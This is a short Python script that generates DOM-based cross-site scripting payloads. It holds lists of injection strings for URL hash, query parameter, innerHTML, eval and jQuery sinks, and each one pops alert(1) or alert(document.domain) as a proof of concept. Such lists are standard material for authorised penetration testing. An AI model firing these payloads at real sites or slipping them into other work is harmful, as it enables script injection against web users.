#!/usr/bin/env python3
"""
DOM XSS Payload Generator
Generates context-aware DOM XSS payloads
"""

class DOMXSSPayloadGenerator:
    def __init__(self):
        self.payloads = {
            'hash': [
                '#<img src=x onerror=alert(1)>',
                '#<svg/onload=alert(1)>',
                '#<script>alert(1)</script>',
                '#javascript:alert(1)',
                '#data:text/html,<script>alert(1)</script>',
            ],
            'search': [
                '?q=<img src=x onerror=alert(1)>',
                '?search=<svg/onload=alert(1)>',
                '?query="><script>alert(1)</script>',
                '?name=javascript:alert(1)',
            ],
            'innerHTML': [
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '<body onload=alert(1)>',
            ],
            'eval': [
                'alert(1)',
                '1;alert(1)',
                'window.location="javascript:alert(1)"',
                'Function("alert(1)")()',
            ],
            'jquery': [
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '$(alert(1))',
            ]
        }
    
    def get_payloads(self, context='all'):
        """Get payloads for specific context"""
        if context == 'all':
            all_payloads = []
            for payloads in self.payloads.values():
                all_payloads.extend(payloads)
            return all_payloads
        
        return self.payloads.get(context, [])
    
    def generate_custom_payload(self, source, sink):
        """Generate custom payload based on source and sink"""
        if 'eval' in sink:
            return 'alert(document.domain)'
        elif 'innerHTML' in sink:
            return '<img src=x onerror=alert(document.domain)>'
        elif 'location' in sink:
            return 'javascript:alert(document.domain)'
        else:
            return '<script>alert(document.domain)</script>'

if __name__ == "__main__":
    gen = DOMXSSPayloadGenerator()
    
    print("DOM XSS Payload Categories:")
    for category in gen.payloads.keys():
        print(f"\n{category.upper()}:")
        for payload in gen.get_payloads(category):
            print(f"  {payload}")
